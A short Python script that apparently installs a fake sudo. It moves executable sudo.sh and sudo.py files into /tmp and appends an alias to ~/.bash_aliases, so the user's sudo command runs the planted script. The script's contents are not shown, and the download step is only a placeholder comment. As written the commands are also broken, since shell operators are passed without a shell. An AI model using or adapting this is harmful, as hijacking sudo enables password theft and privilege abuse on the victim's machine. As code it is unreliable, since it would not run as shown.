import subprocess

# Download .sh files code
#
#
# --------------------------

subprocess.run(
    "chmod +x sudo.sh && mv sudo.sh /tmp/sudo.sh".split(" ")
    )
subprocess.run(
    "chmod +x sudo.py && mv sudo.py /tmp/sudo.py".split(" "),
    )
subprocess.run(
    "printf \"\\nalias sudo='/tmp/sudo.sh'\\n\" >> ~/.bash_aliases",
    stdout=subprocess.PIPE,
    encoding="utf-8"
    )
